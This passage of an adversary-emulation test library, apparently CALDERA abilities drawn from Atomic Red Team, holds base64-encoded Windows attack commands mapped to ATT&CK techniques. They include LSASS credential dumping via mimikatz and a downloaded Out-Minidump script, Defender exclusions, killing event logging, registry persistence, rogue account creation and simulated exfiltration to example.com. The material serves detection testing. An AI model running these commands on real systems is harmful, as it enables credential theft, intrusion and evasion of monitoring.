an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "variations": []}, {"test": "b2RiY2NvbmYuZXhlIC9TIC9BIHtSRUdTVlIgIiN7ZGxsX3BheWxvYWR9In0=", "ability_id": "eee54f6c10eeccfa68e02ec386239023", "technique_name": "Signed Binary Proxy Execution: Odbcconf", "additional_info": {}, "privilege": "", "technique_id": "T1218.008", "platform": "windows", "name": "Odbcconf.exe - Execute Arbitrary DLL", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Execute arbitrary DLL file stored locally.\n", "variations": []}, {"test": "U2V0LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cIiAiU2hlbGwiICJleHBsb3Jlci5leGUsIEM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSIgLUZvcmNl", "ability_id": "aa147165f6c116cb0b0f944abe1db8ce", "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL", "additional_info": {}, "privilege": "", "technique_id": "T1547.004", "platform": "windows", "name": "Winlogon Shell Key Persistence - PowerShell", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cIiAtTmFtZSAiU2hlbGwiIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "variations": []}, {"test": "JHN0YXJ0dXBDbGFzcyA9IEdldC1DaW1DbGFzcyAtQ2xhc3NOYW1lIFdpbjMyX1Byb2Nlc3NTdGFydHVwOyRzdGFydHVwSW5mbyA9IE5ldy1DaW1JbnN0YW5jZSAtQ2ltQ2xhc3MgJHN0YXJ0dXBDbGFzcyAtUHJvcGVydHkgQHtTaG93V2luZG93ID0gMH0gLUNsaWVudE9ubHk7JHByb2Nlc3NDbGFzcyA9IEdldC1DaW1DbGFzcyAtQ2xhc3NOYW1lIFdpbjMyX1Byb2Nlc3M7SW52b2tlLUNpbU1ldGhvZCAtQ2ltQ2xhc3MgJHByb2Nlc3NDbGFzcyAtTWV0aG9kTmFtZSBDcmVhdGUgLUFyZ3VtZW50cyBAeyAgICBDb21tYW5kbGluZSA9ICdjbWQuZXhlIC9jICJ0aW1lb3V0IC9ub2JyZWFrIC90IDEwID5udWwgMj5udWwgJiBkZWwgL2YgI3tsb2NhdGlvbn0iJzsgICAgUHJvY2Vzc1N0YXJ0dXBJbmZvcm1hdGlvbiA9IFtDaW1JbnN0YW5jZV0kc3RhcnR1cEluZm99Ow==", "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934", "technique_name": "Indicator Removal on Host: File Deletion", "additional_info": {}, "privilege": "", "technique_id": "T1070.004", "platform": "windows", "name": "Deadman - Delete agent file", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Deadman ability to delete agent file after termination.", "variations": []}, {"test": "bmV0c2guZXhlIGFkZCBoZWxwZXIgQzpcUGF0aFxmaWxlLmRsbA==", "ability_id": "c0625323bfaa1d08d5e7579c8c00a2c6", "technique_name": "Event Triggered Execution: Netsh Helper DLL", "additional_info": {}, "privilege": "", "technique_id": "T1546.007", "platform": "windows", "name": "Netsh Helper DLL Registration", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Netsh interacts with other operating system components using dynamic-link library (DLL) files\n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIHNldHVwYXBpLmRsbCxJbnN0YWxsSGluZlNlY3Rpb24gRGVmYXVsdEluc3RhbGwgMTI4IC5cNGM4NzBkX1QxMjE4LjAxMV9EZWZhdWx0SW5zdGFsbC5pbmY=", "ability_id": "3d164425117ee9d5f865374c372bedd4", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Rundll32 setupapi.dll Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["4c870d_T1218.011_DefaultInstall.inf"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n", "variations": []}, {"test": "bmV0IGFjY291bnRzIC9kb21haW4=", "ability_id": "2946edba-54d8-11eb-ae93-0242ac130002", "technique_name": "Password Policy Discovery for a domain", "additional_info": {}, "privilege": "", "technique_id": "T1201", "platform": "windows", "name": "Password Policy for a domain", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Password Policy Discovery for a domain", "variations": []}, {"test": "bmV0IHVzZSBjOiBcXHRlc3Rcc2hhcmUgJiYgbmV0IHNoYXJlIHRlc3Q9XFx0ZXN0XHNoYXJlIC9SRU1BUks6InRlc3Qgc2hhcmUiIC9DQUNIRTpObw==", "ability_id": "ed3b15750348bb19147cc63c9fcb46db", "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "additional_info": {}, "privilege": "", "technique_id": "T1070.005", "platform": "windows", "name": "Add Network Share", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Add a Network Share utilizing the command_prompt\n", "variations": []}, {"test": "Y29weSAlU3lzdGVtUm9vdCVcU3lzdGVtMzJcY21kLmV4ZSAlU3lzdGVtUm9vdCVcVGVtcFxsc2Fzcy5leGUgJiYgJVN5c3RlbVJvb3QlXFRlbXBcbHNhc3MuZXhlIC9C", "ability_id": "d5ac8f5ec45224dc36453a9490845f23", "technique_name": "Masquerading: Rename System Utilities", "additional_info": {}, "privilege": "", "technique_id": "T1036.003", "platform": "windows", "name": "Masquerading as Windows LSASS process", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC9RIC9GICVTeXN0ZW1Sb290JVxUZW1wXGxzYXNzLmV4ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n", "variations": []}, {"test": "QzpcV2luZG93c1xTeXN0ZW0zMlxDdXJsLmV4ZSAtVCBjOlx0ZW1wXGF0b21pY3Rlc3RmaWxlLnR4dCB3d3cuZXhhbXBsZS5jb20gJiYgQzpcV2luZG93c1xTeXN0ZW0zMlxDdXJsLmV4ZSAtLXVwbG9hZC1maWxlIGM6XHRlbXBcYXRvbWljdGVzdGZpbGUudHh0IHd3dy5leGFtcGxlLmNvbSAmJiBDOlxXaW5kb3dzXFN5c3RlbTMyXEN1cmwuZXhlIC1kIGM6XHRlbXBcYXRvbWljdGVzdGZpbGUudHh0IHd3dy5leGFtcGxlLmNvbSAmJiBDOlxXaW5kb3dzXFN5c3RlbTMyXEN1cmwuZXhlIC0tZGF0YSBjOlx0ZW1wXGF0b21pY3Rlc3RmaWxlLnR4dCB3d3cuZXhhbXBsZS5jb20=", "ability_id": "ee159de1f33eef7a5d6eb0bb53240baf", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Curl Upload File", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcRXhwbG9yZXIiIC92IE5vTG9nT2ZmIC90IFJFR19EV09SRCAvZCAxIC9mICYmIHJlZyBhZGQgIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXEV4cGxvcmVyIiAvdiBTdGFydE1lbnVMb2dPZmYgL3QgUkVHX0RXT1JEIC9kIDEgL2Y=", "ability_id": "0a7c0eb1dc24bbf312e9ea8d653f2a64", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Disable Windows LogOff Button", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcRXhwbG9yZXIiIC92IE5vTG9nT2ZmIC9mID5udWwgMj4mMSAmJiByZWcgZGVsZXRlICJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xFeHBsb3JlciIgL3YgU3RhcnRNZW51TG9nT2ZmIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuse this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n", "variations": []}, {"test": "QzpcUFNUb29sc1xQc0V4ZWMuZXhlIC9hY2NlcHRldWxhIFxcREMxIC1jICV0bXAlXG1pbWlrYXR6XHg2NFxtaW1pa2F0ei5leGUgImxzYWR1bXA6OmxzYSAvaW5qZWN0IC9pZDo1MDAiICJleGl0Ig==", "ability_id": "cd5baf218626b4ed4fbc9725551f2863", "technique_name": "Process Injection", "additional_info": {}, "privilege": "", "technique_id": "T1055", "platform": "windows", "name": "Remote Process Injection in LSASS via mimikatz", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n", "variations": []}, {"test": "JGV4Y2x1ZGVkcGF0aD0gIkM6XFRlbXAiOyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRleGNsdWRlZHBhdGg=", "ability_id": "ae4b45993a14cfc09857ca0a71d71588", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Tamper with Windows Defender Evade Scanning -Folder", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGV4Y2x1ZGVkcGF0aD0gIkM6XFRlbXAiOyBSZW1vdmUtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRleGNsdWRlZHBhdGg="], "executor": "psh", "access": {}, "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n", "variations": []}, {"test": "TmV3LUl0ZW0gIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmxvZ29uXE5vdGlmeSIgLUZvcmNlOyBTZXQtSXRlbVByb3BlcnR5ICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvblxOb3RpZnkiICJsb2dvbiIgIkM6XFdpbmRvd3NcVGVtcFxhdG9taWNOb3RpZmljYXRpb25QYWNrYWdlLmRsbCIgLUZvcmNl", "ability_id": "82c3b0718dd2fa00302c0d8f143abeeb", "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL", "additional_info": {}, "privilege": "", "technique_id": "T1547.004", "platform": "windows", "name": "Winlogon Notify Key Logon Persistence - PowerShell", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmxvZ29uXE5vdGlmeSIgLUZvcmNlIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon/logoff.\n", "variations": []}, {"test": "bWF2aW5qZWN0ICRwaWQgL0lOSkVDVFJVTk5JTkcgI3tmaWxlX25hbWV9OyBJbnZva2UtV2ViUmVxdWVzdCAje3NlcnZlcl9uYW1lfSAtVXNlQmFzaWNQYXJzaW5n", "ability_id": "25faa3107b46a209e3796752ca49cca9", "technique_name": "Input Capture: Credential API Hooking", "additional_info": {}, "privilege": "", "technique_id": "T1056.004", "platform": "windows", "name": "Hook PowerShell TLS Encrypt/Decrypt Messages", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Hooks functions in PowerShell to read TLS Communications\n", "variations": []}, {"test": "U2V0LUV4ZWN1dGlvblBvbGljeSAtU2NvcGUgQ3VycmVudFVzZXIgLUV4ZWN1dGlvblBvbGljeSBSZW1vdGVTaWduZWQgLUVycm9yQWN0aW9uIElnbm9yZTsgJHVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaGxsZHovSW52b2tlLVBoYW50MG0vZjEzOTZjNDExYTg2N2UxYjQ3MWVmODBjNWM1MzQ0NjYxMDM0NDBlMC9JbnZva2UtUGhhbnQwbS5wczEiOyAkb3V0cHV0ID0gIiRlbnY6VEVNUFxJbnZva2UtUGhhbnQwbS5wczEiOyAkd2MgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyAkd2MuRG93bmxvYWRGaWxlKCR1cmwsICRvdXRwdXQpOyBjZCAkZW52OlRFTVA7IEltcG9ydC1Nb2R1bGUgLlxJbnZva2UtUGhhbnQwbS5wczE7IEludm9rZS1QaGFudDBt", "ability_id": "47ba984c0c40a7c41b4797156c1a5f96", "technique_name": "Impair Defenses: Disable Windows Event Logging", "additional_info": {}, "privilege": "", "technique_id": "T1562.002", "platform": "windows", "name": "Kill Event Log Service Threads", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["V3JpdGUtSG9zdCAiTkVFRCBUTyBSZXN0YXJ0LUNvbXB1dGVyIFRPIEVOU1VSRSBMT0dHSU5HIFJFVFVSTlMiIC1mb3JlIHJlZDsgUmVtb3ZlLUl0ZW0gIiRlbnY6VEVNUFxJbnZva2UtUGhhbnQwbS5wczEiIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html", "variations": []}, {"test": "JG1hY3JvID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbFRleHQoIlBhdGhUb0F0b21pY3NGb2xkZXJcVDE1NjRcc3JjXFQxNTY0LW1hY3JvY29kZS50eHQiKTsgJG1hY3JvID0gJG1hY3JvIC1yZXBsYWNlICJhUkVQTEFDRU1FYSIsICJQYXRoVG9BdG9taWNzRm9sZGVyXFQxNTY0XGJpblxleHRyYWN0bWUuYmluIjsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1NYWxkb2MgLW1hY3JvQ29kZSAiJG1hY3JvIiAtb2ZmaWNlUHJvZHVjdCAiV29yZCIgLXN1YiAiRXh0cmFjdCIgLU5vV3JhcA==", "ability_id": "b7f89af9214876eae185527350ca034f", "technique_name": "Hide Artifacts", "additional_info": {}, "privilege": "", "technique_id": "T1564", "platform": "windows", "name": "Extract binary files via VBA", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIiRlbnY6VEVNUFxleHRyYWN0ZWQuZXhlIiAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n", "variations": []}, {"test": "bmV0IHVzZXIgIkFOT05ZTU9VUyAgTE9HT04iICJUMTEzNl9wYXNzMTIzISIgL2FkZCAvZG9tYWlu", "ability_id": "009947317b829594041e94a316a5e088", "technique_name": "Create Account: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1136.002", "platform": "windows", "name": "Create a new account similar to ANONYMOUS LOGON", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IHVzZXIgIkFOT05ZTU9VUyAgTE9HT04iID5udWwgMj4mMSAvZGVsIC9kb21haW4="], "executor": "cmd", "access": {}, "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n", "variations": []}, {"test": "dnNzYWRtaW4uZXhlIGNyZWF0ZSBzaGFkb3cgL2Zvcj1DOg==", "ability_id": "46018ecb570a06383afecf86c081b2a1", "technique_name": "OS Credential Dumping: NTDS", "additional_info": {}, "privilege": "", "technique_id": "T1003.003", "platform": "windows", "name": "Create Volume Shadow Copy with vssadmin", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "variations": []}, {"test": "TmV3LUl0ZW0gLVBhdGggJ0hLQ1U6XFNPRlRXQVJFXENsYXNzZXNcQ0xTSURce0I1RjgzNTBCLTA1NDgtNDhCMS1BNkVFLTg4QkQwMEI0QTVFN30nIC1WYWx1ZSAnTVNBQSBBY2NQcm9wU2VydmljZXMnOyBOZXctSXRlbSAtUGF0aCAnSEtDVTpcU09GVFdBUkVcQ2xhc3Nlc1xDTFNJRFx7QjVGODM1MEItMDU0OC00OEIxLUE2RUUtODhCRDAwQjRBNUU3fVxJbnByb2NTZXJ2ZXIzMicgLVZhbHVlICRlbnY6VEVNUFxBdG9taWNUZXN0LmRsbDsgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU09GVFdBUkVcQ2xhc3Nlc1xDTFNJRFx7QjVGODM1MEItMDU0OC00OEIxLUE2RUUtODhCRDAwQjRBNUU3fVxJbnByb2NTZXJ2ZXIzMicgLU5hbWUgJ1RocmVhZGluZ01vZGVsJyAtVmFsdWUgJ0FwYXJ0bWVudCcgLVByb3BlcnR5VHlwZSAiU3RyaW5nIjsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFdpbmRvd3NcU3lzdGVtMzJcUlVORExMMzIuRVhFIiAtQXJndW1lbnRMaXN0ICctc3RhIHtCNUY4MzUwQi0wNTQ4LTQ4QjEtQTZFRS04OEJEMDBCNEE1RTd9Jw==", "ability_id": "9b8c9b3a8451aa69daad549e18ff59e9", "technique_name": "Event Triggered Execution: Component Object Model Hijacking", "additional_info": {}, "privilege": "", "technique_id": "T1546.015", "platform": "windows", "name": "COM Hijacking - InprocServer32", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggJ0hLQ1U6XFNPRlRXQVJFXENsYXNzZXNcQ0xTSURce0I1RjgzNTBCLTA1NDgtNDhCMS1BNkVFLTg4QkQwMEI0QTVFN30nIC1SZWN1cnNlIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAuXHBvd2Vydmlldy5wczE7R2V0LURvbWFpbkNvbXB1dGVy", "ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Discover local hosts", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.gdomain", "relationships": [{"edge": "", "source": "remote.host.fqdn", "custom_parser_vals": {}, "target": ""}]}], "payloads": ["powerview.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJwb3dlcnZpZXcucHMxIg=="], "executor": "psh", "access": {}, "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain", "variations": []}, {"test": "JHBsYWludGV4dCA9IChbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LmdldEJ5dGVzKCJQYXRoXG4tLS0tXG5DOlxVc2Vyc1x2aWN0aW0iKSk7ICRrZXkgPSAiYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTYiOyAkY3lwaGVydGV4dCA9ICBAKCk7OyBmb3IgKCRpID0gMDsgJGkgLWx0ICRwbGFpbnRleHQuQ291bnQ7ICRpKyspIHs7ICAkY3lwaGVydGV4dCArPSAkcGxhaW50ZXh0WyRpXSAtYnhvciAka2V5WyRpICUgJGtleS5MZW5ndGhdOzsgfTsgJGN5cGhlcnRleHQgPSBbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LmdldFN0cmluZygkY3lwaGVydGV4dCk7IFtTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpFeHBlY3QxMDBDb250aW51ZSA9ICRmYWxzZTsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBleGFtcGxlLmNvbSAtTWV0aG9kIFBPU1QgLUJvZHkgJGN5cGhlcnRleHQgLURpc2FibGVLZWVwQWxpdmU=", "ability_id": "e8a0ea71db2210a42f888d6f9a28bc4d", "technique_name": "Data Encoding: Standard Encoding", "additional_info": {}, "privilege": "", "technique_id": "T1132.001", "platform": "windows", "name": "XOR Encoded data.", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n", "variations": []}, {"test": "c2MuZXhlIGNyZWF0ZSBBUlRTZXJ2aWNlIGJpblBhdGg9ICIlQ09NU1BFQyUgL2MgcG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLWNvbW1hbmQgTmV3LUl0ZW0gLUl0ZW1UeXBlIEZpbGUgQzpcYXJ0LW1hcmtlci50eHQiICYmIHNjLmV4ZSBzdGFydCBBUlRTZXJ2aWNlICYmIHNjLmV4ZSBkZWxldGUgQVJUU2VydmljZQ==", "ability_id": "3660cf36b4cac4ce733c30ef78b2ffb0", "technique_name": "System Services: Service Execution", "additional_info": {}, "privilege": "", "technique_id": "T1569.002", "platform": "windows", "name": "Execute a Command as a Service", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIEM6XGFydC1tYXJrZXIudHh0ID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n", "variations": []}, {"test": "bmV0IHVzZXIgQXRvbWljQWRtaW5pc3RyYXRvciBVc2VyMkNoYW5nZVBXISAvYWRkICYmIG5ldC5leGUgdXNlciBBdG9taWNBZG1pbmlzdHJhdG9yIEh1SHVIVUhvSG8yODMyODNAZEpE", "ability_id": "aa6b15485a5f50ced34d87fda177b758", "technique_name": "Account Access Removal", "additional_info": {}, "privilege": "", "technique_id": "T1531", "platform": "windows", "name": "Change User Password - Windows", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0LmV4ZSB1c2VyIEF0b21pY0FkbWluaXN0cmF0b3IgL2RlbGV0ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account \"AtomicAdministrator\" with\nthe password \"HuHuHUHoHo283283\".\n", "variations": []}, {"test": "bmV0IHNoYXJlIFxcdGVzdFxzaGFyZSAvZGVsZXRl", "ability_id": "df33cda361afedfcca27c84ed89d169a", "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "additional_info": {}, "privilege": "", "technique_id": "T1070.005", "platform": "windows", "name": "Remove Network Share", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Removes a Network Share utilizing the command_prompt\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbWF0dGlmZXN0YXRpb24vUG93ZXJTcGxvaXQvbWFzdGVyL0V4ZmlsdHJhdGlvbi9PdXQtTWluaWR1bXAucHMxJyk7IGdldC1wcm9jZXNzIGxzYXNzIHwgT3V0LU1pbmlkdW1w", "ability_id": "0310c8a2dcab1e2bdfadf004c1141da8", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Dump LSASS.exe Memory using Out-Minidump.ps1", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXGxzYXNzXyouZG1wIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:SYSTEMROOT\\System32\\lsass_*.dmp.\n", "variations": []}, {"test": 